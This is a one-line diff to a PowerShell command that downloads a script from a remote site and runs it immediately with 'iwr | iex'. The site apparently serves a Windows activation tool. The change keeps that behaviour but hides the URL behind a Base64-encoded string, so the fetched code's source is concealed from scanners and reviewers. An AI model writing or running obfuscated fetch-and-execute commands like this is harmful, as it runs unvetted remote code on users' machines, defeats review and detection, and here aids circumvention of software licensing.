@@ -1,1 +1,1 @@
-iwr -usebasic 'https://get.activated.win' | iex
+iwr -usebasic $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGcAZQB0AC4AYQBjAHQAaQB2AGEAdABlAGQALgB3AGkAbgA='))) | iex
